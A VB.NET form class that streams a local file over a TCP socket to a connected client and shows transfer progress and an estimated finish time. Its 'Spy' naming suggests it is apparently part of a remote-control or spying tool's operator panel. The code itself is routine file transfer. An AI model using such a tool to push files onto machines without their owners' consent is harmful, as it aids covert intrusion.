Imports System.ComponentModel
 Public Class Upload
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Client
     Public FileStream As System.IO.FileStream = Nothing
     Public Upstream As Long = 0
     Public _stream As Long = 0
     Public TotalSize As Long
     Public elapsed_time As TimeSpan
     Public start_time As DateTime
     Public stop_time As DateTime
     Public SPL As String()
     Public Title As String = "null"
     Public WithEvents Bgworker As ComponentModel.BackgroundWorker
     Private Sub SpyStyle()
         For Each gr As DataGridView In Me.Controls.OfType(Of DataGridView)()
            gr.BackgroundColor = SpySettings.DefaultColor_Background
            gr.BackColor = SpySettings.DefaultColor_Background
            gr.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background
              gr.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
            gr.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground
            gr.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
        Next
     End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub Upload_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Icon = New Icon(reso.res_Path & "\Icons\win\16.ico")
         SpyStyle()
         DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f
         DGV0.DefaultCellStyle.Font = reso.f
         TimeFinish.Interval = 100
         TimeFinish.Enabled = True
         If FileStream Is Nothing And Upstream = 0 Then
             FileStream = New System.IO.FileStream(SPL(3), IO.FileMode.Open, IO.FileAccess.Read)
         End If
         If Bgworker Is Nothing Then
             Bgworker = New ComponentModel.BackgroundWorker
         End If
         If Not Bgworker.IsBusy Then
             Bgworker.RunWorkerAsync()
         Else
             If FileStream IsNot Nothing Then
                 FileStream.Dispose()
                 FileStream.Close()
             End If
             classClient.Close(Client, "Upload files Done")
             Me.Close()
         End If
         Progr.Interval = 10
         Progr.Enabled = True
         Me.Text = Title
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
    End Sub
     Private Sub worker_DoWork(ByVal sender As Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bgworker.DoWork
         Dim buffer(4096) As Byte
         Dim bytesRead As Integer
         If FileStream IsNot Nothing Then
             Do
                 bytesRead = FileStream.Read(buffer, 0, buffer.Length)
                 If bytesRead > 0 Then
                     Try
                         If Client.Client.Connected Then
                             Client.Client.Poll(infoServer.Microseconds, Net.Sockets.SelectMode.SelectWrite)
                             Client.Client.SendBufferSize = buffer.Length
                             Client.GetStream.Write(buffer, 0, bytesRead)
                             _stream += bytesRead
                             Upstream += buffer.Length
                             classClient.mysocket.BytesSent += buffer.Length
                         End If
                     Catch ex As Exception
                         Exit Do
                     End Try
                     If Upstream = CInt(SPL(1)) Then
                         Exit Do
                     End If
                 End If
                 Threading.Thread.Sleep(1)
             Loop While bytesRead > 0
         End If
         If FileStream IsNot Nothing Then
             FileStream.Dispose()
             FileStream.Close()
         End If
     End Sub
     Private Sub Upload_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
         TimeFinish.Enabled = False
         Progr.Enabled = False
         If Not classClient Is Nothing Then
             classClient.qit = True
             classClient.Close(Client, "Upload end")
         End If
         If FileStream IsNot Nothing Then
             FileStream.Dispose()
             FileStream.Close()
         End If
         If bgworker IsNot Nothing Then
             Try
                 bgworker.Dispose()
                 bgworker.CancelAsync()
             Catch ex As Exception
             End Try
         End If
     End Sub
     Private Sub TimeFinish_Tick(sender As Object, e As EventArgs) Handles TimeFinish.Tick
         If DGV0.Rows.Count > 0 Then
             If Not Me._stream >= Me.TotalSize Then
                 If Me._stream > 0 Then
                     Me.stop_time = Now
                     Me.elapsed_time = Me.stop_time.Subtract(Me.start_time)
                     Dim lng As Long = (Me.TotalSize - Me._stream) * Me.elapsed_time.TotalSeconds / Me._stream
                     Dim time As String = Codes.ToTime(lng)
                     If Not time.Equals("0:0:0") Then
                         Dim cur As DateTime = System.DateTime.Now()
                         Dim dt As DateTime = Convert.ToDateTime(time)
                         cur = cur.AddHours(dt.Hour)
                         cur = cur.AddMinutes(dt.Minute)
                         cur = cur.AddSeconds(dt.Second)
                         DGV0.Rows(4).Cells(1).Value = String.Format("[{0}] [{1}]", time, cur.ToString("h:mm:ss"))
                     End If
                End If
             Else
                 Me.Close()
             End If
         End If
     End Sub
     Private Sub Progr_Tick(sender As Object, e As EventArgs) Handles Progr.Tick
         If Not _stream = 0 Or _stream > ProgressBar1.Maximum Then
             ProgressBar1.Value = _stream
         End If
     End Sub
End Class